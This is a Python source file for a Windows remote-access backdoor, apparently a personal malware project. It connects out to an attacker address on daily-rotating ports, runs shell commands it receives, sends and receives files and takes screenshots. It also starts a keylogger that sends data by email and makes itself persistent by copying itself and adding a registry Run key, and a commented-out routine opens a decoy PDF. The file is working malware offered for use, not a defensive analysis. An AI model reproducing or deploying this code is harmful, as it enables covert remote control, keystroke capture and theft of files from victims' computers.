# -*- coding: utf-8 -*-
# Author: Yiğit Şık 06/11/2021

# This script will establish the reverse shell connection between attacker and victim machine
# Commands taken from attacker will be executed through this script on victim computer,
# then the results will be sent back

# Standard Modules
import shutil
import sys
import time
from queue import Queue
import os
import socket
import base64
import subprocess
import threading
import json
import datetime
import random

# User Defined Modules
from Logger import Logger


class Backdoor:
    NUMBER_OF_THREADS = 6
    JOB_NUMBER = [0, 3, 4, 6]
    Ip = "127.0.0.1"  # 20.101.135.232
    NUMBER_OF_PORTS = 5
    MAX_PORT_VALUE = 65535
    MIN_PORT_VALUE = 49152

    is_date_changed = False

    port_list = []

    queue = Queue()

    # Initialize the socket connection via constructor with the given ip and port value
    def __init__(self):
        self.__become_persistent()
        # self.__open_facade()
        self.connection = None
        self.logger = Logger(self.queue)
        self.create_workers()
        self.create_jobs()

    # ****************** THREAD POOL ******************************************************************

    # Thread pool pattern makes it easy to observe and manage threads
    # Reduces the costs occur when creating and deleting threads

    def create_workers(self):
        for _ in range(self.NUMBER_OF_THREADS):
            t = threading.Thread(target=self.work)
            t.daemon = True
            t.start()

    def work(self):

        while True:
            x = self.queue.get()

            if x == 0:
                self.randomize_ports()

            elif x == 1:
                self.connect_to_server()

            elif x == 2:
                self.command_executor()

            elif x == 3:
                self.logger.key_logger()

            elif x == 4:
                self.logger.write_file()

            elif x == 5:
                self.logger.send_email()

            elif x == 6:
                self.check_date()

            elif x == 7:
                self.logger.track_event()

            self.queue.task_done()

    def create_jobs(self):
        for x in self.JOB_NUMBER:
            self.queue.put(x)
        self.queue.join()

    # ****************** THREAD POOL ******************************************************************

    def randomize_ports(self):

        date_time = datetime.datetime.now()
        current_day = date_time.day
        step = (self.MAX_PORT_VALUE - self.MIN_PORT_VALUE) / self.NUMBER_OF_PORTS
        random.seed(current_day)
        seed = random.random()
        self.port_list = []

        for i in range(5):
            self.port_list.append(round(self.MIN_PORT_VALUE + step * i + step * seed))

        self.queue.put(1)

    def check_date(self):

        last_time = datetime.datetime.now()
        last_day = last_time.day

        while True:

            new_time = datetime.datetime.now()
            current_day = new_time.day

            if last_day != current_day:
                last_day = current_day
                self.is_date_changed = True
                self.queue.put(0)
                self.queue.put(5)

            time.sleep(60)
            self.is_date_changed = False

    def connect_to_server(self):

        succeeded = False
        retry_interval = 5
        index = 0

        while succeeded is False and self.is_date_changed is False:

            try:
                # TCP Connection
                self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.connection.connect((self.Ip, self.port_list[index]))
                succeeded = True
                self.queue.put(2)
                print("Connected to port {}".format(self.port_list[index]))
            except Exception as msg:
                print("An attempt to connect server ( port: {} ) has failed ".format(self.port_list[index]) + str(msg))
                print("Will Retry in {} seconds".format(retry_interval))
                index = (index + 1) % self.NUMBER_OF_PORTS
                time.sleep(retry_interval)

    # Execute given command string in shell
    def execute_system_command(self, command: list):

        command = " ".join(command)

        task = subprocess.Popen(args=command, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE,
                                stderr=subprocess.PIPE)
        stdout, stderr = task.communicate()
        output_byte = stdout + stderr
        output_str = output_byte.decode()
        return output_str

    # Send Messages as Json format for data integrity purposes
    # Sending data plainly might cause problems because end of the data stream cannot be known
    def __send_data(self, data):
        json_data = json.dumps(data).encode()
        self.connection.send(json_data)

    # Read data in 1024 byte chunks until json file is fully received
    def __receive_data(self):
        json_data = ""
        while True:
            try:
                json_data += self.connection.recv(1024).decode()
                return json.loads(json_data)
            except ValueError:
                continue

    # Change directory to given path. Equivalent of "cd" command
    def __change_working_directory_to(self, path):
        try:
            os.chdir(path)
            return "[+] Changing working directory to " + path
        except OSError as e:
            return e.strerror

    # Read and write files in base64 format to transfer bytes reliably.
    def __read_file(self, path):
        with open(path, 'rb') as file:
            return base64.b64encode(file.read())

    def __write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload successful"

    def __become_persistent(self):

        try:
            dirname = os.environ["temp"] + "\\EFD58DB1-29ZZ-4401-A51A-EE19304E85A5"
            if not os.path.exists(dirname):
                os.mkdir(dirname)
            location = dirname + "\\utils.exe"
            if not os.path.exists(location):
                shutil.copyfile(sys.executable, location)
                subprocess.call(
                    'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v utils /t REG_SZ /d "' + location + '"',
                    shell=True)
        except Exception as msg:
            print("Persistence failed" + str(msg))

    # def __open_facade(self):
    #     try:
    #         if ('--startup' in sys.argv) is False:
    #             file_name = sys._MEIPASS + "\\talks-of-tedexe.pdf"
    #             subprocess.Popen(file_name, shell=True)
    #     except:
    #         pass

    # Here we are waiting commands from attacker machine in an infinite loop
    def command_executor(self):

        while True:

            command_result = ""

            # Wait (This is a blocking code) command string from attacker
            command: list = self.__receive_data()

            # Close the connection
            if command[0] == "exit":
                self.connection.close()
                exit()

            # Change the directory. The default is where this script resides
            elif command[0] == "cd":
                try:
                    if len(command) > 1:
                        command_result = self.__change_working_directory_to(command[1])
                    else:
                        command_result = self.execute_system_command(command)
                    self.__send_data(command_result)

                except Exception as e:
                    self.__send_data(e)
                    continue

            # Send files from victim to attacker
            elif command[0] == "download":
                try:
                    command_result = self.__read_file(command[1]).decode()
                    self.__send_data(command_result)

                except FileNotFoundError:
                    self.__send_data("Cannot find the file specified")

            # Write files that attacker sends
            elif command[0] == "upload":
                try:
                    command_result = self.__write_file(command[1], command[2])
                    self.__send_data(command_result)

                except FileNotFoundError:
                    self.__send_data("Cannot find the file specified")

            # Take a screenshot and send it to attacker
            elif command[0] == "screenshot":

                # TODO Get screenshot from all clients

                image = self.logger.get_screenshot()
                image = base64.b64encode(image).decode()
                self.__send_data(image)

            elif command[0] == "track":

                if len(command) < 2:
                    self.__send_data("Missing argument")

                elif len(command) is 2:
                    if command[1] in ("--list", "-l"):
                        print(len(command))
                        tracks = self.logger.get_tracks()
                        self.__send_data(tracks)

                elif len(command) is 3:
                    if command[1] in ("--add", "-a"):
                        if command[2] is not None:
                            self.logger.add_track(command[2])
                            self.__send_data("{} Successfully added to tracks".format(command[2]))

                    elif command[1] in ("--remove", "-r"):
                        if command[2] is not None:
                            result = self.logger.remove_track(command[2])
                            self.__send_data(result)
                else:
                    self.__send_data("Unknown command")

            # Check if connection is available
            elif command[0] == 'AreYouAwake?':
                self.__send_data(command)

            # Execute other builtin commands
            else:
                command_result = self.execute_system_command(command)
                self.__send_data(command_result)


# Connect to the attacker's computer
my_backdoor = Backdoor()
